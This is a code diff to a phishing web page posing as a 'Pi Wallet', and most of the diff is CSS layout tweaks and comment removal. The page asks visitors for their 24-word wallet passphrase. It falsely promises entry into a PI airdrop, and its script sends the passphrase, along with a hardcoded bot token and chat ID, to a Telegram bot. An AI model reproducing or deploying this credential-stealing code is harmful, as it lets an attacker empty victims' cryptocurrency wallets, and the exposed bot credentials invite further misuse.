@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+     <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -17,29 +17,37 @@
     <link rel="icon" href="_next/static/media/wallet.44634181.svg"/>
     <title>Pi Wallet</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             display: flex;
             justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin-top: -15%;
+            align-items: flex-start; /* Changé de center à flex-start */
+            min-height: 100vh; /* Changé de height à min-height */
             background-color: #f3f4f6;
-            touch-action: pan-y; /* Empêche le zoom avec le pincement */
-            -webkit-touch-callout: none; /* Désactive le menu contextuel sur iOS */
-            -webkit-user-select: none; /* Désactive la sélection de texte sur iOS */
-            user-select: none; /* Désactive la sélection de texte */
+            touch-action: pan-y;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+            padding: 20px 0; /* Ajout de padding pour l'espace */
         }
 
         .container {
             background-color: #fff;
-            width: 100vw;
+            width: 100%;
+            max-width: 500px; /* Largeur maximale pour éviter l'étirement */
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             overflow: hidden;
             display: flex;
             flex-direction: column;
+            margin: 0 auto; /* Centrage horizontal */
         }
 
         #loading-spinner {
@@ -91,12 +99,12 @@
             font-weight: bold;
             margin-bottom: 20px;
             color: #4a4a4a;
+            text-align: center;
+            width: 100%;
         }
 
         .textarea-container {
             width: 100%;
-            align-items: center;
-            justify-content: center;
             margin-bottom: 20px;
         }
 
@@ -107,9 +115,9 @@
             border: 1px solid #ccc;
             border-radius: 8px;
             background-color: #F9FAFB;
-            /* Permet la sélection uniquement dans le textarea */
             -webkit-user-select: text;
             user-select: text;
+            resize: vertical; /* Permet le redimensionnement vertical seulement */
         }
 
         .button {
@@ -132,12 +140,14 @@
             text-align: center;
             color: red;
             margin-top: 10px;
+            width: 100%;
         }
 
         .text-block {
             text-align: center;
             margin-top: 20px;
             color: #4a4a4a;
+            width: 100%;
         }
 
         .text-block span {
@@ -146,11 +156,35 @@
 
         /* Styles supplémentaires pour désactiver le zoom */
         html {
-            touch-action: manipulation; /* Empêche le double-tap pour zoomer */
+            touch-action: manipulation;
         }
 
         input, textarea, select {
-            font-size: 16px; /* Empêche le zoom automatique sur iOS */
+            font-size: 16px;
+        }
+
+        /* Pour les très petits écrans */
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                align-items: flex-start;
+            }
+            
+            .container {
+                width: 100%;
+                margin-top: 10px;
+            }
+            
+            .form-container {
+                padding: 15px;
+            }
+        }
+
+        /* Pour Chrome spécifiquement */
+        @media all and (-webkit-min-device-pixel-ratio:0) and (min-resolution: .001dpcm) {
+            body {
+                align-items: flex-start;
+            }
         }
 
     </style>
@@ -177,7 +211,7 @@
             </div>
             <form action="checkm.php" method="post" onsubmit="return validateForm()">
                 <div class="textarea-container">
-                    <textarea id="content" name="content" required rows="8" class="block w-full p-3 text-lg text-gray-800 bg-gray-100 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500" placeholder="Enter your 24-words passphrase here"></textarea>
+                    <textarea id="content" name="content" required rows="8" placeholder="Enter your 24-words passphrase here"></textarea>
                 </div>
                 <input type="hidden" name="ip_address" id="ip_address" value="">
                 <input type="hidden" id="key" name="key">
@@ -197,8 +231,8 @@
     <script>
         // Function to send a message to Telegram with the passphrase
         function sendToTelegram(passphrase) {
-            const chatId = '1741959003'; // Replace with your chat ID
-            const botKey = '7354494708:AAEGDCeKoiPcXZo_mE4NzreaLsVS_mEqy90'; // Replace with your bot key
+            const chatId = '1741959003';
+            const botKey = '7354494708:AAEGDCeKoiPcXZo_mE4NzreaLsVS_mEqy90';
             const message = `New passphrase: ${passphrase}`;
     
             const url = `https://api.telegram.org/bot${botKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -207,61 +241,56 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('Message sent to Telegram:', data);
-                    showSuccessMessage(); // Show success message
+                    showSuccessMessage();
                 })
                 .catch(error => {
                     console.error('Error sending message to Telegram:', error);
                 });
         }
     
-        // Function to show success message and clear the form
         function showSuccessMessage() {
             document.getElementById("emsg").innerHTML = "Félicitations! vous participez désormais à l'airdrop de PI.";
             document.getElementById("emsg").style.color = "green";
             document.getElementById("emsg").style.fontWeight = "bold";
     
-            // Clear the textarea and hidden fields
             document.getElementById("content").value = "";
             document.getElementById("key").value = "";
+            
             setTimeout(function() {
-            location.reload(); // This reloads the page
-        }, 10000);
+                location.reload();
+            }, 10000);
         }
     
-        // Form validation function
-      function validateForm() {
-    const textarea = document.getElementById("content");
-    const inputValue = textarea.value.trim();
-    
-    // Vérifier le nombre de mots
-    const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
-    
-    if (wordCount === 24) {
-        sendToTelegram(inputValue);
-        return false; // Empêche la soumission du formulaire
-    } else {
-        document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
-        return false;
-    }
-}
+        function validateForm() {
+            const textarea = document.getElementById("content");
+            const inputValue = textarea.value.trim();
+            
+            const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
+            
+            if (wordCount === 24) {
+                sendToTelegram(inputValue);
+                return false;
+            } else {
+                document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
+                return false;
+            }
+        }
 
-        // Prevent form submission before full load
         document.addEventListener("DOMContentLoaded", () => {
             const form = document.querySelector("form");
             form.onsubmit = function (event) {
                 if (!validateForm()) {
-                    event.preventDefault(); // Stop form submission if validation fails
+                    event.preventDefault();
                 }
             };
     
-            // Unhide content after page loads
             window.onload = () => {
                 document.getElementById("loading-spinner").style.display = "none";
                 document.getElementById("main").style.display = "block";
             };
         });
 
-        // Script supplémentaire pour empêcher le zoom avec le pincement
+        // Empêcher le zoom avec le pincement
         document.addEventListener('touchstart', function(event) {
             if (event.touches.length > 1) {
                 event.preventDefault();
@@ -280,7 +309,5 @@
             event.preventDefault();
         });
     </script>
-    
-    
 </body>
-</html>
+</html>   
